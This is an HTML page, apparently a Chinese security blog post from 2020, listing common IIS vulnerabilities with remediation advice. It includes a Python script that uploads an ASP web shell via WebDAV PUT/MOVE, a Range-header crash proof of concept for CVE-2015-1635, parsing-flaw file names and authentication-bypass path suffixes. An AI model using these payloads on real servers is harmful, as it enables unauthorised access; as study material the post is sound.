@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="中间件IIS常见漏洞记录">
+<meta name="keywords" content="中间件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="中间件漏洞之IIS（记录）">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;03&#x2F;%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BIIS%EF%BC%88%E8%AE%B0%E5%BD%95%EF%BC%89&#x2F;index.html">
+<meta property="og:site_name" content="AqYoung">
+<meta property="og:description" content="中间件IIS常见漏洞记录">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;Ez6miVp.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;EUNJrSy.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;PlXlJmO.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;0q5nUps.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;egAugqC.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;vZRkNTV.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;EEBjDks.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;yL8oBRx.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;SVHPoDm.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;6Ec0Ega.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;Chb4C5I.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;Qw4zTSH.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;xMH6gRM.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;c7GAOr7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;fQsW7n3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;CqFbgQb.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;LD0DNVf.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;WocqQJp.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;tsS1GEo.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;KBgHuw6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;lEiChUW.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;AzLmd9v.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;Mtj15Zc.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;iUrYGkH.png">
+<meta property="og:updated_time" content="2020-04-03T09:10:47.895Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.imgur.com&#x2F;Ez6miVp.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/04/03/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BIIS%EF%BC%88%E8%AE%B0%E5%BD%95%EF%BC%89/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>中间件漏洞之IIS（记录） | AqYoung</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">AqYoung</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">致力于Bash、Python开发渗透工具，分享渗透知识与技巧</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/03/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BIIS%EF%BC%88%E8%AE%B0%E5%BD%95%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="AqYoung">
+      <meta itemprop="description" content="努力将一切"Regular attacks"工程化！">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AqYoung">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          中间件漏洞之IIS（记录）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-04-03 14:31:49 / 修改时间：17:10:47" itemprop="dateCreated datePublished" datetime="2020-04-03T14:31:49+08:00">2020-04-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>中间件IIS常见漏洞记录<a id="more"></a></p>
+<h1 id="中间件和IIS简介："><a href="#中间件和IIS简介：" class="headerlink" title="中间件和IIS简介："></a>中间件和IIS简介：</h1><h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><blockquote>
+<p>中间件是一类连接软件组件和应用的计算机软件，它包括一组服务。以便于运行在一台或多台机器上的多个软件通过网络进行交互。</p>
+</blockquote>
+<h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><blockquote>
+<p>是互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。</p>
+</blockquote>
+<blockquote>
+<p>IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p>
+</blockquote>
+<p><img src="https://i.imgur.com/Ez6miVp.png" alt=""></p>
+<h1 id="IIS常见漏洞整理："><a href="#IIS常见漏洞整理：" class="headerlink" title="IIS常见漏洞整理："></a>IIS常见漏洞整理：</h1><p><img src="https://i.imgur.com/EUNJrSy.png" alt=""></p>
+<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a>IIS 6.x</h3><p>1、默认会将 *.asp;.jpg 此种格式的文件名，当成Asp解析<br><img src="https://i.imgur.com/PlXlJmO.png" alt=""></p>
+<p>2、默认会将 *.asp/目录下的所有文件当成Asp解析<br><img src="https://i.imgur.com/0q5nUps.png" alt=""></p>
+<p>3、将扩展名为.asa，.cdx，.cer解析为asp<br><img src="https://i.imgur.com/egAugqC.png" alt=""></p>
+<p><em>修复建议：</em></p>
+<p>1、设置上传目录的执行权限，不允许执行脚本。</p>
+<p>2、对上传的文件进行随机重命名，并且去除文件名回显。</p>
+<h3 id="IIS-7-x"><a href="#IIS-7-x" class="headerlink" title="IIS 7.x"></a>IIS 7.x</h3><p><em>安装IIS7.5</em></p>
+<p>1、安装应用程序开发功能<br><img src="https://i.imgur.com/vZRkNTV.png" alt=""></p>
+<p>2、下载<a href="http://museum.php.net/php5/php-5.2.10-win32-installer.msi" target="_blank" rel="noopener">php-5.2.10-win32-installer.msi</a></p>
+<p>-&gt; 安装：一直下一步直到web server setup，选择选择IIS fastcgi</p>
+<p><img src="https://i.imgur.com/EEBjDks.png" alt=""></p>
+<p>3、编辑：ISAPI或者CGI限制</p>
+<p><img src="https://i.imgur.com/yL8oBRx.png" alt=""></p>
+<p>-&gt;添加</p>
+<p><img src="https://i.imgur.com/SVHPoDm.png" alt=""></p>
+<p>4、编辑：处理程序映射</p>
+<p><img src="https://i.imgur.com/6Ec0Ega.png" alt=""></p>
+<p>-&gt;添加</p>
+<p><img src="https://i.imgur.com/Chb4C5I.png" alt=""></p>
+<p>5、测试phpinfo</p>
+<p><img src="https://i.imgur.com/Qw4zTSH.png" alt=""></p>
+<p><em>利用：</em></p>
+<p>1、Fast-CGI运行模式下,在任意文件。</p>
+<p>例：test.jpg后面加上/.php，会将test.jpg 解析为php文件<br><img src="https://i.imgur.com/xMH6gRM.png" alt=""></p>
+<p><em>修复建议：</em></p>
+<p>1、修改php.ini</p>
+<pre><code>; cgi.fix_pathinfo=0
+//修改之前为：; cgi.fix_pathinfo=1</code></pre><h2 id="PUT任意文件写入"><a href="#PUT任意文件写入" class="headerlink" title="PUT任意文件写入"></a>PUT任意文件写入</h2><p>1、影响版本：6.x</p>
+<p>开启WebDAV和写权限</p>
+<p><img src="https://i.imgur.com/c7GAOr7.png" alt=""></p>
+<p><img src="https://i.imgur.com/fQsW7n3.png" alt=""></p>
+<p><img src="https://i.imgur.com/CqFbgQb.png" alt=""></p>
+<p><img src="https://i.imgur.com/LD0DNVf.png" alt=""></p>
+<p>2、EXP</p>
+<pre><code>#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+#需要运行两次，第一次上传shell.txt。第二次用move方法。
+import requests
+
+# 分别需要put,move的url（在这里修改url）
+put_url = &apos;http://192.168.1.133/shell.txt&apos;
+move_url = &apos;http://192.168.1.133/shell.txt&apos;
+move_headers = {
+    &apos;Destination&apos;: &apos;http://192.168.1.133/shell.asp&apos;
+}
+# put的脚本（这里修改password）
+put_data = &apos;&lt;%execute(request(&quot;passwd&quot;))%&gt;&apos;
+post_data = {
+    &apos;apple&apos;: &apos;&apos;
+}
+try:
+    response = requests.request(&apos;PUT&apos;, url=put_url, data=put_data)
+    if response.status_code == 200:
+        response = requests.request(&apos;MOVE&apos;, url=move_url, headers=move_headers)
+        if response.status_code == 207:
+            response = requests.post(url=&apos;http://192.168.1.133/shell.asp&apos;, data=post_data)
+            print(response.content.decode(&quot;gb2312&quot;))
+        else:
+            print(response.status_code)
+except:
+    pass</code></pre><p><a href="https://www.codercto.com/a/48257.html" target="_blank" rel="noopener" title="https://www.codercto.com/a/48257.html">https://www.codercto.com/a/48257.html</a></p>
+<p><em>修复建议：</em></p>
+<p>关闭WebDAV 和 写权限</p>
+<h2 id="短文件漏洞"><a href="#短文件漏洞" class="headerlink" title="短文件漏洞"></a>短文件漏洞</h2><p>1、影响条件：NTFS 8.3支持开启</p>
+<p>原理：在cmd中输入 dir\x 查看短文件名，可以看到存在的文件返回404，不存在返回400</p>
+<p><img src="https://i.imgur.com/WocqQJp.png" alt=""></p>
+<p><img src="https://i.imgur.com/tsS1GEo.png" alt=""></p>
+<p>2、EXP：<a href="https://github.com/lijiejie/IIS_shortname_Scanner" target="_blank" rel="noopener" title="https://github.com/lijiejie/IIS_shortname_Scanner">https://github.com/lijiejie/IIS_shortname_Scanner</a></p>
+<p>3、参考：<br><a href="https://www.freebuf.com/news/197144.html" target="_blank" rel="noopener" title="https://www.freebuf.com/news/197144.html">https://www.freebuf.com/news/197144.html</a></p>
+<p><em>修复建议：</em></p>
+<pre><code>#1、关闭NTFS 8.3支持（1关闭，0开启）
+fsutil behavior set disable8dot3 1
+#2、修改注册表regedit
+找到路径HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，修改NtfsDisable8dot3NameCreation为1
+#重启系统生效</code></pre><h2 id="HTTP-sys远程代码执行（CVE-2015-1635）"><a href="#HTTP-sys远程代码执行（CVE-2015-1635）" class="headerlink" title="HTTP.sys远程代码执行（CVE-2015-1635）"></a>HTTP.sys远程代码执行（CVE-2015-1635）</h2><p>1、影响范围：<br>Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2</p>
+<p>2、POC:</p>
+<pre><code>curl http://192.168.1.144 -H &quot;Host: 192.168.1.144&quot; -H &quot;Range: bytes=0-18446744073709551615&quot;</code></pre><p><img src="https://i.imgur.com/KBgHuw6.png" alt=""></p>
+<p>2、MSF_POC：</p>
+<p><a href="https://www.cvedetails.com/cve/CVE-2015-1635/" target="_blank" rel="noopener" title="https://www.cvedetails.com/cve/CVE-2015-1635/">https://www.cvedetails.com/cve/CVE-2015-1635/</a></p>
+<p><img src="https://i.imgur.com/lEiChUW.png" alt=""></p>
+<p><img src="https://i.imgur.com/AzLmd9v.png" alt=""></p>
+<p><img src="https://i.imgur.com/Mtj15Zc.png" alt=""></p>
+<p>3、参考：</p>
+<p><a href="https://www.freebuf.com/vuls/64195.html" target="_blank" rel="noopener" title="https://www.freebuf.com/vuls/64195.html">https://www.freebuf.com/vuls/64195.html</a></p>
+<h2 id="远程代码执行（CVE-2017-7269）"><a href="#远程代码执行（CVE-2017-7269）" class="headerlink" title="远程代码执行（CVE-2017-7269）"></a>远程代码执行（CVE-2017-7269）</h2><p>1、影响范围：</p>
+<p>在Windows 2003 R2, Enterprise Edition Service Pack 2）上使用IIS 6.0并开启WebDAV扩展。</p>
+<p>2、EXP:</p>
+<p><a href="https://github.com/zcgonvh/cve-2017-7269" target="_blank" rel="noopener" title="https://github.com/zcgonvh/cve-2017-7269">https://github.com/zcgonvh/cve-2017-7269</a>（msf自带的只能适用于默认物理路径）</p>
+<p>在载入完上面的exp后，值得注意的是physicalpathlength的值</p>
+<p>例如：我的物理路径为C:\Inetpub\wwwroot\aspcms（需要加上\）长度就为26</p>
+<p><img src="https://i.imgur.com/iUrYGkH.png" alt=""></p>
+<p>3、参考：<br><a href="http://www.admintony.com/CVE-2017-7269.html" target="_blank" rel="noopener" title="http://www.admintony.com/CVE-2017-7269.html">http://www.admintony.com/CVE-2017-7269.html</a></p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="CGI环境块伪造"><a href="#CGI环境块伪造" class="headerlink" title="CGI环境块伪造"></a>CGI环境块伪造</h3><p>1、影响版本：IIS4、IIS5 &amp;&amp;winnt、Win2000</p>
+<p>2、参考：<a href="https://www.freebuf.com/vuls/31444.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/31444.html</a></p>
+<h3 id="认证绕过"><a href="#认证绕过" class="headerlink" title="认证绕过"></a>认证绕过</h3><p>1、影响版本：IIS6.0、IIS7.5</p>
+<p>2、漏洞详情：对用户输入未经正确验证，攻击者可利用漏洞构造特殊数据，在服务器进程上下文中获取密码保护资源和查看源代码文件的未授权访问</p>
+<p>3、攻击手段：</p>
+<p>IIS6.0:<br>将::$INDEX_ALLOCATION后缀添加到目录名称后，如/admin::$INDEX_ALLOCATION/index.php</p>
+<p>IIS7.5:<br>将:$i30:$INDEX_ALLOCATION后缀添加到目录名称后，如/admin:$i30:$INDEX_ALLOCATION/index.asp</p>
+<h3 id="FTPd服务MLST命令栈缓冲区溢出漏洞"><a href="#FTPd服务MLST命令栈缓冲区溢出漏洞" class="headerlink" title="FTPd服务MLST命令栈缓冲区溢出漏洞"></a>FTPd服务MLST命令栈缓冲区溢出漏洞</h3><p>1、MSF_POC</p>
+<ul>
+<li>MS09-053/CVE-2009-3023</li>
+</ul>
+<h3 id="拒绝服务漏洞"><a href="#拒绝服务漏洞" class="headerlink" title="拒绝服务漏洞"></a>拒绝服务漏洞</h3><ul>
+<li><p>CVE-2019-0941</p>
+</li>
+<li><p>CVE-2019-9512</p>
+</li>
+<li><p>等等……</p>
+</li>
+</ul>
+<h2 id="尾巴："><a href="#尾巴：" class="headerlink" title="尾巴："></a>尾巴：</h2><p>在收集完IIS的漏洞之后，感觉都很简单，但是发现实际复现的时候还是遇到了一些状况特别是CVE-2017-7269，在复现的过程中就因为系统的版本、以及EXP本身的问题，这个漏洞有很多EXP但是，并不是每个版本都可以利用成功，有一些细微差别。总体，虽然都是一些比较旧的漏洞，也很难遇到，但是还是有一些收获。</p>
+<hr>
+<p><strong>声明：</strong></p>
+<ul>
+<li><p>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</p>
+</li>
+<li><p>本文属于<a href="https://aqyoung.github.io/" target="_blank" rel="noopener" title="https://aqyoung.github.io/">@ayoung博客</a>，未经许可禁止转载：</p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" rel="tag"># 中间件</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/30/CDN_bypass1/" rel="prev" title="绕过CDN查找真实IP方法总结">
+      <i class="fa fa-chevron-left"></i> 绕过CDN查找真实IP方法总结
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#中间件和IIS简介："><span class="nav-number">1.</span> <span class="nav-text">中间件和IIS简介：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#中间件"><span class="nav-number">1.1.</span> <span class="nav-text">中间件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IIS"><span class="nav-number">1.2.</span> <span class="nav-text">IIS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#IIS常见漏洞整理："><span class="nav-number">2.</span> <span class="nav-text">IIS常见漏洞整理：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#解析漏洞"><span class="nav-number">2.1.</span> <span class="nav-text">解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS-6-x"><span class="nav-number">2.1.1.</span> <span class="nav-text">IIS 6.x</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS-7-x"><span class="nav-number">2.1.2.</span> <span class="nav-text">IIS 7.x</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PUT任意文件写入"><span class="nav-number">2.2.</span> <span class="nav-text">PUT任意文件写入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#短文件漏洞"><span class="nav-number">2.3.</span> <span class="nav-text">短文件漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-sys远程代码执行（CVE-2015-1635）"><span class="nav-number">2.4.</span> <span class="nav-text">HTTP.sys远程代码执行（CVE-2015-1635）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#远程代码执行（CVE-2017-7269）"><span class="nav-number">2.5.</span> <span class="nav-text">远程代码执行（CVE-2017-7269）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他"><span class="nav-number">2.6.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CGI环境块伪造"><span class="nav-number">2.6.1.</span> <span class="nav-text">CGI环境块伪造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#认证绕过"><span class="nav-number">2.6.2.</span> <span class="nav-text">认证绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FTPd服务MLST命令栈缓冲区溢出漏洞"><span class="nav-number">2.6.3.</span> <span class="nav-text">FTPd服务MLST命令栈缓冲区溢出漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#拒绝服务漏洞"><span class="nav-number">2.6.4.</span> <span class="nav-text">拒绝服务漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#尾巴："><span class="nav-number">2.7.</span> <span class="nav-text">尾巴：</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="AqYoung"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">AqYoung</p>
+  <div class="site-description" itemprop="description">努力将一切"Regular attacks"工程化！</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">AqYoung</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
